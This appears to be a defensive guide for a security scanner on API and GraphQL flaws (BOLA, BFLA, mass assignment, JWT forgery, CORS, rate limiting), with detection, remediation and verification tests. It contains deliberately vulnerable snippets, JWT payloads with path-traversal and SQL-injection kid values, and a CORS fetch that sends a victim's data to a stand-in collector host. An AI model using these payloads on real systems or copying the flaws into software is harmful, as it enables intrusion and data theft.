# API and GraphQL Surfaces (CWE-639, CWE-285, CWE-915, CWE-347, CWE-942, CWE-770)

## What it is

An HTTP API trusts three things it should not: an object identifier supplied by
the caller, the presence of a session instead of the caller's role, and the
shape of the request body. The trust boundary crossed is between one
authenticated principal (or an anonymous caller) and an object, function, or
field belonging to another principal. TriageKit reports these surfaces from the
repo scan (`triagekit scan <path> --json`: rules `cors-wildcard`,
`cors-wildcard-header`, `jwt-verify-off`, `jwt-in-source`) and from the Website
Security Adviser (`triagekit webscan <url> --json`: the `cors`, `headers` and
`api` categories, plus `/graphql`, `/graphiql`, `/swagger-ui.html` and `/api/*`
sensitive-path hits). Both are **presence** checks: they show the surface, they
cannot tell you whether the object id was authorized. That judgement is per
handler, below.

## Detection

### Broken object-level authorization (IDOR / BOLA, CWE-639)

The object id is the vulnerability, not the endpoint. Look for a handler that
takes an id and performs a read or write with no ownership predicate; the
signature is a handler that references the principal for authentication and
never again.

```python
@app.get("/api/invoices/<int:iid>")
@login_required
def invoice(iid):
    return jsonify(db.get_invoice(iid))          # no owner filter -> CWE-639

# FastAPI: the dependency proves who, the query never asks whose
async def order(oid: int, user=Depends(current_user)):
    return await Order.get(oid)                   # no filter_by(owner=user.id)
```

Express is the same shape: `app.get("/api/orders/:id", requireAuth, ...)` calls
`Order.findById(req.params.id)` and never compares `req.user`.

The rule that separates a finding from a false positive: **the handler must
contain an ownership predicate** (`owner_id = current_user.id`,
`filter_by(tenant=...)`, an `org` scope from the token) or the lookup itself must
be namespaced (`/api/me/orders/<iid>`). "Login is required" is authentication
and answers a different question. Report the missing predicate at the line the
handler names; if the model layer does the check, say which function and quote
its filter. The shape of the identifier (sequential integer vs UUID) is an
aggravating detail, never the finding: a UUID with no ownership check is equally
broken and only harder to scan for.

### Broken function-level authorization (BFLA, CWE-285)

Look for a route whose authorization is weaker than its verb or effect: a `GET`
that is public and a `PUT` on the same path that is not gated; a middleware list
applied per verb, so one verb was forgotten.

```js
// verb-level gating, one verb forgotten -> BFLA
app.get("/api/users", requireAuth, listUsers);
app.post("/api/users", requireAdmin, createUser);
app.put("/api/users/:id", requireAuth, updateUser);   // any user edits any user
```

The Python shape is a decorator that checks "logged in" where a role is needed,
e.g. `@login_required` on a `def update_user(uid)` that calls
`db.set_role(uid, request.json.get("role"))`.

GraphQL equivalent: a mutation resolver that never checks the role, so
`mutation { updateUser(id: 1) { role } }` is the function-level bypass. Same
detection: find every mutation, find the role check for each.

### Mass assignment / over-posting (CWE-915)

The request body is passed whole into a model constructor or update. Look for the
body object reaching `create`, `update`, `load`, `save`, `Object.assign` or a
spread without a field allowlist; in C# the same thing is a handler that binds
the entity type (`public IActionResult Update(User user)`):

```js
Object.assign(user, req.body);            // client can set user.role
app.post("/api/users", async (req, res) => res.json(await User.create(req.body)));
```

Python shape: `UserSchema().load(request.json)` with no `only=[...]`, or a
Django `ModelForm` with `fields = "__all__"`.

The confirming check: send the field the UI does not render (`role`,
`is_admin`, `balance`, `tenant_id`) and see whether it persists. If the model
schema rejects unknown fields, there is no finding.

### Excessive data exposure (CWE-200)

The response carries more than the caller is entitled to: a `SELECT *`, the ORM
entity serialized directly, or a GraphQL field exposing internal state
(`passwordHash`, `resetToken`, `internalNotes` with no field-level
authorization). Report verbose error bodies (stack traces, SQL text, framework
banners) in the same category; see `skills/09-sql-injection.md` for error-driven
SQLi and `skills/13-secrets-and-tokens.md` for credentials in responses.

### GraphQL specifics

- **Introspection in production.** The web adviser reports any path containing
  `graphql` or `graphiql` that returns 200 (category `api`, CWE-200, confidence
  medium) -- a path hint, not proof. Proof is the introspection query below, from
  an unauthenticated client.
- **Batching.** A JSON array body `[{...},{...}]` accepts N operations in one
  HTTP request, defeating per-request rate limits and bypassing authz when only
  the first operation is checked. Aliases (`a: login(...) b: login(...)`) do the
  same without an array, so credential stuffing needs no batching support at all.
  Look for batching enabled in the server config, and for rate limiting that
  counts requests rather than operations.
- **Depth / complexity.** No limit means one query enumerates the graph:
  `user { friends { friends { friends ... } } } }`. Look for
  `graphql-depth-limit`, `graphql-validation-complexity`, or `graphql-armor`
  (`maxDepth`, `maxTokens`, `maxAliases`, `maxDirectives`, cost limit).
- **Field-level authz.** An object returned wholesale exposes every field to
  every caller who can reach the parent. Detection is per-type: which fields are
  sensitive, and does the resolver check the caller.

### JWT (CWE-347, CWE-798)

The repo scan catches two shapes with one regex
(`jwt\.decode\s*\([^)]*verify\s*=\s*False|algorithms\s*=\s*\[["']none["']\]`);
in Node the same class is `jsonwebtoken` with no `algorithms` array. Everything
else must be read from the verification call:

```python
jwt.decode(token, key, verify=False)              # rule: jwt-verify-off
jwt.decode(token, key, algorithms=["none"])       # rule: jwt-verify-off
# algorithm confusion RS256 -> HS256: the RSA public key used as an HMAC secret
jwt.decode(token, open("public.pem").read(), algorithms=["HS256"])
# claims not validated: no aud, no iss, exp/iat not required
jwt.decode(token, key, algorithms=["RS256"])      # signature only
# kid used to build a path or a query, unvalidated
jwt.decode(token, key=lambda k: open(os.path.join(KEYS, header["kid"])).read())
```

Also report `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`
(rule `jwt-in-source`, CWE-798) and the web adviser's JWT-in-JavaScript-bundle
check (CWE-922) -- see `skills/13-secrets-and-tokens.md`.

### CORS misconfiguration (CWE-942)

Two regex rules fire: `cors\s*\(\s*\{[^}]*origin\s*:\s*['\"]?\*['\"]?` and
`Access-Control-Allow-Origin:\s*\*`; the web adviser adds the header pair
`ACAO: *` with `ACAC: true`. The dangerous shapes are NOT regex-matcheable:

```js
app.use(cors({ origin: true, credentials: true }));   // reflects any Origin
res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
res.setHeader("Access-Control-Allow-Credentials", "true");   // the exploit pair
```

Flask-CORS variant: `CORS(app, origins="*", supports_credentials=True)`.

Add to that: an `Origin: null` reflected (sent by `file://`, `data:` and
sandboxed iframes, so an attacker controls it), allowlists built by substring or
regex (`origin.includes("example.com")` also matches `example.com.evil.example`),
and a `*` allowlist of methods and headers on the preflight.

### Rate limiting and resource allocation (CWE-770, CWE-307)

Look for the endpoints where guessing has value (`/login`, `/otp`, `/reset`,
`/register`, search, export) and check for a limit that counts operations,
applies per account as well as per IP, and caps unbounded parameters:

Shape: `limit = int(request.args.get("limit", 100))` with no ceiling, so
`?limit=1000000` reaches `User.query.limit(limit).all()`.

In-process limiters that say "5 per minute" but run per worker behind a load
balancer allow 5 x workers. Check the store, not just the rule.

## How it works (attack mechanics)

IDOR: the id is the only thing deciding whose object you get. Against a local
fixture with two accounts:

```text
GET /api/invoices/1041   Authorization: Bearer <user A token>   -> 200 OK
GET /api/invoices/1042   Authorization: Bearer <user A token>   -> 200 OK  (BOLA)
```

Sequential ids make enumeration a script; the same handler with a UUID is still
BOLA, because an id in a link or an email is obtained, not guessed. BFLA is the
same move one level up -- one authenticated low-privilege token performs an admin
function (`POST /api/users/7/role {"role": "admin"}`).

Mass assignment: the client adds a field the form never submits, so the request
body is `POST /api/register {"email": "a@example.test", "password": "pw", "role":
"admin", "credits": 100000}`.

JWT, three shapes against a local fixture: `alg: none` with an empty signature;
an HS256 token signed with the server's RSA public key (which the attacker has,
because it is public); and a `kid` that is a traversal or a SQL fragment,
reaching a key file or a key lookup the server trusts.

```json
{"alg": "none", "typ": "JWT"}                     -> empty signature
{"alg": "HS256", "kid": "../../../../etc/passwd"} -> traversal into a key path
{"alg": "HS256", "kid": "' OR 1=1 --"}            -> injection into a key lookup
```

CORS: the attacker page issues a credentialed cross-origin request and, because
the server reflected the attacker's origin with `ACAC: true`, the browser hands
the script the response. The reflected variant needs no spoofing, so it works
from any page the victim visits.

```js
fetch("https://fixture.example/api/me", { credentials: "include" })
  .then((r) => r.json())
  .then((d) => send("https://collector.example/" + JSON.stringify(d)));
```

## Is it actually exploitable? (exploitability test)

1. **BOLA: did a second principal's request return a first principal's data?**
   Log in as user A and user B on the fixture, then issue B's request with A's
   token. A 403 or 404 with no body means the check exists; if the response is
   the other tenant's row, quote the body field as proof. Run it again with no
   credential at all: that moves `PR` to `N` and the severity with it, and the
   report must say which of the two you tested.
2. **BFLA: did the low-privilege token really reach the function?** Test with the
   low-privilege token, not an anonymous request: an anonymous 401 proves only
   authentication, which most apps already have.
3. **Mass assignment: did the extra field persist, and does the caller get it?**
   POST it, then GET the object and confirm it changed. A field in the model but
   not in the serialized response is not exposed. If the schema rejects unknown
   fields, there is no finding.
4. **GraphQL: does introspection succeed unauthenticated?** If it is disabled,
   check whether the schema leaks anyway (error text, a docs page, autocomplete
   in the bundle). Both are reported, at different strengths.
5. **JWT: does the verifier really accept the forged token?** Send `alg:none` and
   the HS256-with-public-key token to the fixture and require a 401. A library
   that pins algorithms by configuration is not exploitable, however unusual the
   call looks.
6. **CORS: does the response vary with `Origin`, and does the app depend on a
   credential the browser attaches automatically?** A reflected origin on an API
   requiring an `Authorization: Bearer` header (stored in JS, not a cookie) gives
   an attacker nothing -- there is no ambient credential to ride.
7. **Rate limiting: does brute force have value, and is there per-account
   lockout?** Missing limits on a public static list is informational; missing
   limits on an OTP endpoint is the finding.

## False positives (do NOT report)

- A handler that fetches by id **and** filters by the caller (`owner=req.user.id`,
  `tenant_id=current_user.tenant`), or a path that is intrinsically scoped
  (`/api/me/orders/<iid>`) where the principal is part of the resource path and
  no other principal's object can be named. Quote the filter or the path shape;
  that is the predicate, and the scoped design is the fix, not a bypass.
- Public read-only objects where no private field is in the payload (public
  catalog entries, published posts). Check the payload before dismissing.
- Endpoints that legitimately need no function-level check: `/login`, `/health`,
  `/graphql` on a public schema with no sensitive type, a public search.
- A static origin allowlist in `cors({ origin: ["https://app.example.test"] })`
  or an explicit reflected check against a set. That is the correct fix shape;
  only a *reflected* origin with credentials is exploitable.
- `Access-Control-Allow-Origin: *` on an API that accepts no cookies and no
  ambient credential. Browsers reject `*` combined with credentials, so that pair
  is a configuration error to fix (report as hygiene), not a live cross-origin
  read.
- Mass assignment where the framework rejects unknown fields or the serializer
  declares an `only=` allowlist. Verify once by sending the field.
- Introspection enabled on a development or staging host, or behind an
  authentication wall the introspection query itself cannot pass.
- JWT verification that pins `algorithms` and asserts `aud`/`iss` by
  configuration. Missing `exp` claims are only a finding when the library's
  default does not validate expiry or an option turns it off; mainstream
  libraries do validate `exp`, so a "no exp check" claim must show a hand-rolled
  verifier.
- A `kid` used as an index into a fixed in-memory map of key names, with no
  filesystem path and no database query. Not injectable.
- A rate limiter that is per-account as well as per-IP, or that counts operations
  (aliases, batched array elements) rather than HTTP requests; a `?limit=` capped
  by a server-side maximum (`min(limit, MAX)`); or an endpoint where account
  lockout or a step-up challenge already caps attempts. Report the lockout state,
  not its absence.

## Severity

CVSS v4.0, no numeric score. Representative vectors:

- BOLA, cross-tenant read, authenticated, or with no credential required (the
  second moves `PR` to `N` and `VI`/`SI` to `H`):
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`
- BFLA / mass assignment to a role field (privilege escalation):
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`
- JWT `alg:none` / algorithm confusion, authentication bypass:
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`
- Reflected-Origin CORS with credentials (needs the victim to visit a page):
  `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- No rate limit on OTP or login (needs a guessing campaign):
  `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`

Metrics that move: `PR` from `L` to `N` when no session is required to reach the
object or function; `AC` from `L` to `H` where the object id must be obtained (a
link, another response) rather than guessed; `UI` to `A` for CORS and
clickjacking findings where a victim page must be visited, `UI:N` for pure API
abuse; `SC`/`SI` to `H` in a multi-tenant deployment. Always emit the vector and
the calculator link:
`https://www.first.org/cvss/calculator/v4.0#CVSS:4.0/<vector>`.

## Remediation

BOLA -- the predicate goes in the query, not after it:

```python
# before
return jsonify(db.get_invoice(iid))
# after
inv = Invoice.query.filter_by(id=iid, owner_id=current_user.id).first_or_404()
return jsonify(inv)
```

Express equivalent, and note the status code: 404, not 403, so the object is not
confirmed to exist (`Order.findOne({ _id: req.params.id, owner: req.user.id })`).

BFLA, per-verb middleware:

```js
// before
app.put("/api/users/:id", requireAuth, updateUser);
// after
app.put("/api/users/:id", requireAuth, requireRole("admin"), updateUser);
const requireRole = (r) => (req, res, next) => req.user.roles.includes(r)
  ? next() : res.status(403).json({ error: "forbidden" });
```

Mass assignment -- pick the fields, never spread the body:

```js
// before
Object.assign(user, req.body);
// after
const updated = await User.findByIdAndUpdate(
  req.params.id, pick(req.body, ["name", "email"]), { new: true });
```

```python
# after -- a new column is not exposed by default
user = UserSchema(only=("name", "email")).load(request.json)
# C#: public IActionResult Update([Bind("Id,Name,Email")] User user)
```

Excessive data exposure -- the response model is the contract, so internal fields
are absent by design (`class UserOut(BaseModel): id: int; name: str; email: str`
and return `UserOut.model_validate(u)`).

GraphQL -- disable introspection, bound the parser and the cost, and authorize
the field, not just the parent type:

```js
// before -- batching on, no depth limit, introspection open, no field authz
const server = new ApolloServer({ typeDefs, resolvers });
User: { passwordHash: (u) => u.passwordHash }
// after -- introspection and batching off, depth and token limits on
const { ApolloArmor } = require("@escape.tech/graphql-armor");
const depthLimit = require("graphql-depth-limit");
const server = new ApolloServer({
  typeDefs, resolvers,
  validationRules: [depthLimit(6)],
  plugins: [ApolloServerPluginLandingPageDisabled(), NoIntrospection],
});
new ApolloArmor({ maxDepth: { n: 6 }, maxAliases: { n: 15 }, maxTokens: { n: 1000 } });
// after -- the resolver enforces the boundary on the field, not the parent type
User: { passwordHash: (u, args, ctx) => {
  if (ctx.user.id !== u.id) throw new ForbiddenError("not your field");
  return u.passwordHash;
} }
```

JWT -- pin the algorithm, index the key by allowlisted `kid`, assert the claims
(and in Node: `jwt.verify(token, publicKey, { algorithms: ["RS256"], audience:
"api", issuer: "https://auth.fixture.example" })`):

```python
# before
jwt.decode(token, open("public.pem").read(), algorithms=["HS256"])
# after
KEYS = {"key-2026-01": load_public("key-2026-01.pem")}   # a fixed map, not a path
jwt.decode(token, KEYS[header["kid"]], algorithms=["RS256"], audience=AUD,
           issuer=ISS, options={"require": ["exp", "iat", "aud", "iss"]})
```

CORS -- a fixed allowlist, or a function that only ever returns a member of it:

```js
// before
app.use(cors({ origin: true, credentials: true }));
// after
const ALLOWED = ["https://app.fixture.example"];
app.use(cors({ origin: ALLOWED, credentials: true }));
```

Rate limiting and allocation -- count operations (aliases and batched array
elements), key on the account as well as the IP, share state across workers, and
cap every unbounded parameter (`limit = min(int(request.args.get("limit",
100)), 200)`):

```js
const limiter = rateLimit({ windowMs: 60_000, max: 5, store: new RedisStore(...),
                            keyGenerator: (req) => req.body.email ?? req.ip });
app.use("/api/login", limiter);
```

## Verify the fix

1. Two-account cross-access test, the one that settles BOLA:

```python
def test_cannot_read_other_tenants_invoice(client, tokens):
    r = client.get("/api/invoices/1042",
                   headers={"Authorization": f"Bearer {tokens.user_a}"})
    assert r.status_code in (403, 404)
    assert "owner_b" not in r.text
```

2. Mass assignment regression test: POST the extra field, then GET the object and
   assert it is unchanged (`assert u["role"] == "member"` after posting
   `{"role": "admin"}`).
3. JWT forgery test, both shapes must be rejected: send `alg_none_token()` and
   `hs256_with_public_key_token()` to `/api/me` and require 401 for each.
4. GraphQL posture from an unauthenticated client. Introspection disabled returns
   an error naming the rule, not types; a batched array body must return 400:

```bash
curl -s -X POST https://fixture.example/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}'
curl -s -o /dev/null -w '%{http_code}\n' -X POST https://fixture.example/graphql \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"}]'   # expect 400
```

5. CORS reflection and rate limit in one pass. A hostile origin must produce no
   `Access-Control-Allow-Origin` line and no `Access-Control-Allow-Credentials:
   true` paired with a reflected origin; then 20 login or OTP attempts for one
   account must return 429 after the threshold, with `Retry-After` present:

```bash
curl -sI -H 'Origin: https://attacker.example' https://fixture.example/api/me \
  | grep -i 'access-control-'
```

6. Re-run the scanners and confirm the rules are clean:

```bash
triagekit scan <path> --json | rg -i 'cors-wildcard|jwt-verify-off|jwt-in-source'
rg -n "verify\s*=\s*False|algorithms\s*=\s*\[\s*[\"']none[\"']" src/
triagekit webscan https://fixture.example --json | rg -i 'category": "(cors|api)'
```

Until those return nothing, keep the finding open; see `skills/08-progress-and-ci.md`
for the re-scan gate and `skills/27-false-positive-control.md` before closing
anything by hand.
